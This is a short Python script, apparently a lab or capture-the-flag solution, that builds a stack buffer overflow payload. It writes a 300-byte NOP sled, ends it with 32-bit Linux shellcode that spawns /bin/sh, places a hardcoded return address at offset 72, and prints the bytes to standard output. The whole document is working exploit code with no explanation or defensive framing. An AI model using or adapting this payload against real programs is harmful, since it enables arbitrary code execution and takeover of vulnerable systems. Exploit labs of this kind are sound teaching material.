import sys
shellcode = b""
shellcode += b"\x31\xc0\x50\x68\x2f\x2f\x73"
shellcode += b"\x68\x68\x2f\x62\x69\x6e\x89"
shellcode += b"\xe3\x89\xc1\x89\xc2\xb0\x0b"
shellcode += b"\xcd\x80\x31\xc0\x40\xcd\x80"
content=bytearray(0x90 for i in range (300))
start = 300 - len(shellcode)
content[start:] = shellcode
ret = 0xffffc730 + 20
content[72:76] = (ret).to_bytes(4,byteorder="little")
sys.stdout.buffer.write(content)
